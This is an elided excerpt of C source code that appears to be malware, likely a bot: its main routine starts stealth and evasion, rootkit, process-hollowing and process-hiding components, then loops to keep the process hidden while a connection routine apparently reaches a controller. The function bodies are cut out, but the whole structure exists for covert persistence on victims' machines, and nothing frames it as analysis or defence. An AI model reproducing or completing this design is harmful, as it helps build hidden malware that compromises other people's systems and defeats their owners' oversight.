...
int main(int argc, char **args)
{
    ...
    // Initialize stealth and evasion
    stealth_init();
    
    // Initialize rootkit functionality
    rootkit_init();
    
    // Initialize process hollowing
    hollowing_init();
    
    // Initialize comprehensive process hiding
    process_hiding_init();
    ...
    while (TRUE)
    {
        // Perform comprehensive process hiding operations
        static int hiding_counter = 0;
        if (++hiding_counter % 50 == 0) {
            process_hiding_update();
        }
        
        // Emergency hiding if needed
        if (hiding_counter % 200 == 0) {
            process_hiding_emergency_hide();
        }
...
static void establish_connection(void)
{
    ...
    #ifdef DEBUG
        printf("DEBUG: connect() returned %d, errno=%d, pending_connection=%d\n", result, errno, pending_connection);
    #endif
}
